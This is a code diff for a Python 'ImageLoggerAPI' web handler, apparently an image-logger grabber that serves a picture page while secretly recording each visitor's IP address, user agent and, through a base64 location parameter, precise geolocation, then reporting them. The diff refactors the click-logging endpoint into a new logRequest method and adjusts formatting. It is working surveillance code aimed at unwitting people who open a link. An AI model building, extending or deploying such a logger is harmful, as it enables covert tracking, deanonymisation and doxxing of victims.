@@ -1,4 +1,4 @@
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
@@ -149,16 +149,6 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
-            if self.path.startswith("/log"):
-                ip = self.headers.get('x-forwarded-for')
-                useragent = self.headers.get('user-agent')
-                makeReport(ip, useragent=useragent, endpoint=self.path)
-                self.send_response(200)
-                self.send_header('Content-type', 'application/json')
-                self.end_headers()
-                self.wfile.write(b'{"status": "logged"}')
-                return
-
             if config["imageArgument"]:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
@@ -180,7 +170,7 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img" onclick="fetch('/log?{self.path[1:]}').then(response => response.json().then(data => console.log(data)))"></div>'''.encode()
+}}</style><div class="img" onclick="fetch('/log?url={parse.quote(url)}').then(response => response.json().then(data => console.log(data)))"></div>'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
@@ -191,7 +181,7 @@ height: 100vh;
                 self.end_headers()
                 if config["buggedImage"]:
                     self.wfile.write(binaries["loading"])
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                 return
             
             else:
@@ -200,9 +190,9 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
                 
 
                 message = config["message"]["message"]
@@ -264,6 +254,25 @@ if (!currenturl.includes("g=")) {
             reportError(traceback.format_exc())
 
         return
+    
+    def logRequest(self):
+        try:
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+            url = dic.get("url")
+            ip = self.headers.get('x-forwarded-for')
+            useragent = self.headers.get('user-agent')
+            makeReport(ip, useragent=useragent, endpoint=s.split("?")[0], url=url)
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(b'{"status": "logged"}')
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(b'{"status": "error"}')
+            reportError(traceback.format_exc())
     
     do_GET = handleRequest
     do_POST = handleRequest
